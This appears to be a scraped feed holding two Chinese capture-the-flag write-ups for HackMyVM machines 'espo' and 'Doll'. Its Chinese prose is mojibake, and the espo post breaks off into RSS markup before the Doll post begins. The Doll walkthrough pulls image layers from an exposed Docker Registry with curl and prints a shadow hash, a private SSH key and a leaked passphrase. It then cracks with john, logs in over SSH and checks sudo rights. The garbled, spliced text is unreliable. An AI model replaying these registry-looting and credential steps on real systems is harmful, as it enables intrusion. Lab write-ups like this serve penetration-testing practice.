**é¶æœº**ï¼š[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
**éš¾åº¦**ï¼šé»„è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.236
**æœ¬æœº IP**ï¼š192.168.205.141

---

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
```

---

# 2.è¸©ç‚¹

![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)

æ˜¯ä¸ªç™»å½•æ ï¼Œæœç´¢ä¸€ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```

åªæœ‰æƒé™æå‡æ¼æ´ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰ç”¨æˆ·ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_espo.html</guid><pubDate>Thu, 20 Mar 2025 08:05:38 +0000</pubDate></item><item><title>hmv_Doll</title><link>https://7r1UMPH.github.io/post/hmv_Doll.html</link><description># hmv_Doll

# 0.é—²èŠ

![image](assets/image-20250129201949-6vewhf4.png)

**é¶æœºï¼š** https://hackmyvm.eu/machines/machine.php?vm=Doll

**é¶æœº IPï¼š** 192.168.72.129

**kali IPï¼š** 192.168.72.128

ä»Šå¤©å¹´åˆäºŒï¼Œæœ‰ç‚¹ç©ºï¼Œæ›´æ–°ä¸€ä¸‹wp

# 1.æ‰«æ

â€‹`nmap`â€‹å¼€æ‰«

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
Nmap scan report for 192.168.72.129
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1007/tcp open  unknown
MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
                                                                  
```

å…¶ä¸­`1007`â€‹ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæœåŠ¡ï¼Œæˆ‘ä»¬è¯¦ç»†æ‰«æä¸€ä¸‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
Nmap scan report for 192.168.72.129
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
1007/tcp open  http    Docker Registry (API: 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds

```

ä¸çŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œæˆ‘ä»¬ç­‰ä¼šæœç´¢ä¸€ä¸‹

# 2.è¸©ç‚¹

åœ¨**hacktricks**â€‹ä¸Šæ‰¾åˆ°[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)è¿™ç¯‡æ–‡ç« 

![image](assets/image-20250129202845-u4dct3k.png)

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.72.129:1007/v2/_catalog
{'repositories':['dolly']}
                              
```

ç»§ç»­åˆ©ç”¨

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.72.129:1007/v2/dolly/tags/list
{'name':'dolly','tags':['latest']}
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
{
   'schemaVersion': 1,
   'name': 'dolly',
   'tag': 'latest',
   'architecture': 'amd64',
   'fsLayers': [
      {
         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'
      }
   ],
   'history': [
      {
         'v1Compatibility': '{\'architecture\':\'amd64\',\'config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'container\':\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\',\'container_config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'created\':\'2023-04-25T08:58:11.460540528Z\',\'docker_version\':\'23.0.4\',\'id\':\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\',\'os\':\'linux\',\'parent\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\'}'
      },
      {
         'v1Compatibility': '{\'id\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\',\'parent\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'comment\':\'buildkit.dockerfile.v0\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'ARG passwd=devilcollectsit\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'parent\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop)  CMD [\\\'/bin/sh\\\']\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.348438709Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \']}}'
      }
   ],
   'signatures': [
      {
         'header': {
            'jwk': {
               'crv': 'P-256',
               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',
               'kty': 'EC',
               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',
               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'
            },
            'alg': 'ES256'
         },
         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',
         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'
      }
   ]
}                                                                                                                                     

â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ mkdir tmp     
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ cd tmp 
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ tar -xf blob1.tar
                         
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ ls -la
æ€»è®¡ 24
drwxrwxr-x 5 kali kali 4096  1æœˆ29æ—¥ 20:32 .
drwxrwxr-x 4 kali kali 4096  1æœˆ29æ—¥ 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1æœˆ29æ—¥ 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ etc
drwxr-xr-x 3 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ home
drwx------ 2 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ root
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ cd etc 
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/etc]
â””â”€$ ls -al
æ€»è®¡ 32
drwxr-xr-x 2 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ .
drwxrwxr-x 5 kali kali 4096  1æœˆ29æ—¥ 20:32 ..
-rw-r--r-- 1 kali kali  710 2023å¹´ 4æœˆ25æ—¥ group
-rw-r--r-- 1 kali kali  697 2022å¹´11æœˆ 4æ—¥ group-
-rw-r--r-- 1 kali kali 1223 2023å¹´ 4æœˆ25æ—¥ passwd
-rw-r--r-- 1 kali kali 1223 2023å¹´ 4æœˆ25æ—¥ passwd-
-rw-r----- 1 kali kali  553 2023å¹´ 4æœˆ25æ—¥ shadow
-rw-r----- 1 kali kali  448 2023å¹´ 4æœˆ25æ—¥ shadow-
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/etc]
â””â”€$ cat *   
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
bela:x:1000:
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:!:19472:0:99999:7:::
                                 
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/etc]
â””â”€$ cd ..                                
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ ls la 
ls: æ— æ³•è®¿é—® 'la': æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ ls -la
æ€»è®¡ 24
drwxrwxr-x 5 kali kali 4096  1æœˆ29æ—¥ 20:32 .
drwxrwxr-x 4 kali kali 4096  1æœˆ29æ—¥ 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1æœˆ29æ—¥ 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ etc
drwxr-xr-x 3 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ home
drwx------ 2 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ root
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp]
â””â”€$ cd home 
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/home]
â””â”€$ ls -al
æ€»è®¡ 12
drwxr-xr-x 3 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ .
drwxrwxr-x 5 kali kali 4096  1æœˆ29æ—¥ 20:32 ..
drwxr-xr-x 3 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ bela
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/home]
â””â”€$ cd bela 
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/home/bela]
â””â”€$ l -al 
æ€»è®¡ 16
drwxr-xr-x 3 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ ./
drwxr-xr-x 3 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ ../
-rw------- 1 kali kali   57 2023å¹´ 4æœˆ25æ—¥ .ash_history
drwxr-xr-x 2 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ .ssh/
-rwxr-xr-x 1 kali kali    0 1969å¹´12æœˆ31æ—¥ .wh..wh..opq*
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/home/bela]
â””â”€$ cat .ash_history                     
pwd
ls -la
mkdir .ssh
cd .ssh
nano id_rsa
vi id_rsa
exit
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/home/bela]
â””â”€$ cat .wh..wh..opq
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/test/tmp/home/bela]
â””â”€$ cd .ssh       
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/tmp/home/bela/.ssh]
â””â”€$ ls -al
æ€»è®¡ 12
drwxr-xr-x 2 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ .
drwxr-xr-x 3 kali kali 4096 2023å¹´ 4æœˆ25æ—¥ ..
-rw-r--r-- 1 kali kali 2635 2023å¹´ 4æœˆ25æ—¥ id_rsa
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/tmp/home/bela/.ssh]
â””â”€$ cat id_rsa    
-----BEGIN OPENSSH PRIVATE KEY-----
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
VtVwCw==
-----END OPENSSH PRIVATE KEY-----
                                             
```

çœäº†ï¼Œéƒ½ä¸ç”¨çˆ†ç ´shadowäº†

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/tmp/home/bela/.ssh]
â””â”€$ ssh2john id_rsa &gt; hash
                                         
â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/tmp/home/bela/.ssh]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan

```

çˆ†ç ´ä¸å‡ºæ¥ï¼Œä¸ä¼šæ˜¯ç”¨è¿™ä¸ªå§

![image](assets/image-20250129204242-qkg0s6r.png)

è¯•è¯•

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/tmp/home/bela/.ssh]
â””â”€$ chmod 600 id_rsa 

â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/tmp/home/bela/.ssh]
â””â”€$ ssh bela@192.168.72.129 -i id_rsa
ssh: connect to host 192.168.72.129 port 22: No route to host
                                                                                                                                     
â”Œâ”€â”€(kaliã‰¿kali)-[~/â€¦/tmp/home/bela/.ssh]
â””â”€$ ssh bela@192.168.72.129 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
bela@doll:~$ id
uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.ææƒ

```
bela@doll:~$ sudo -l
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337

```

